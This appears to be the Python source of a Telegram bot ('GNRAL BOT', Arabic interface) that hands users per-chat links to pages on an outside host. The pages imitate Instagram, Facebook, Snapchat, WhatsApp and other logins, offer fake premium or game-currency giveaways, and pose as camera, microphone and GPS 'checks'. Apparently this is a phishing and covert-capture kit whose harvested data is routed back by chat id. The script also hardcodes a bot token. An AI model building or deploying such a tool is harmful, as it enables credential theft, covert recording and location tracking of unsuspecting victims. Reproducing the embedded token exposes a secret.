import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, ContextTypes

TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html-5waj.onrender.com"  # <- الرابط الصحيح لملفات HTML

logging.basicConfig(level=logging.INFO)

PAGES = [
    ("معلومات النظام", "device.html", "📱"),
    ("مسابقة الحلم 2026", "dream.html", "🏆"),
    ("فحص الميكروفون", "mic.html", "🎤"),
    ("فحص الفيديو", "video.html", "🎥"),
    ("شحن ببجي", "pubg_cuc.html", "🎮"),
    ("Discord Nitro", "discord.html", "🎧"),
    ("Instagram", "instagram.html", "📸"),
    ("Facebook", "facebook.html", "📘"),
    ("Reddit", "reddit.html", "🤖"),
    ("فحص الكاميرا", "camera.html", "📷"),
    ("X (Twitter)", "twitter.html", "🐦"),
    ("TikTok", "tiktok.html", "🎵"),
    ("WhatsApp Web", "whatsapp.html", "💬"),
    ("Snapchat", "snapchat.html", "👻"),
    ("تحسين الموقع (GPS)", "gps.html", "📍"),
    ("Telegram Premium", "telegram.html", "✈️"),
    ("YouTube Premium", "youtube.html", "▶️"),
]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    keyboard = []
    row = []
    for name, filename, emoji in PAGES:
        url = f"{BASE_URL}/{filename}?chat={chat_id}"
        row.append(InlineKeyboardButton(f"{emoji} {name}", url=url))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "✨ *مرحباً بك في بوت GNRAL BOT* ✨\n\n"
        "📌 *اختر الخدمة التي تريدها:*\n"
        "🔹 سيتم إضافة معرف الدردشة تلقائياً.\n\n"
        "———————————————————\n"
        "© 2026 *GNRAL BOT* - جميع الحقوق محفوظة",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    print("✅ البوت يعمل...")
    app.run_polling()

if __name__ == "__main__":
    main()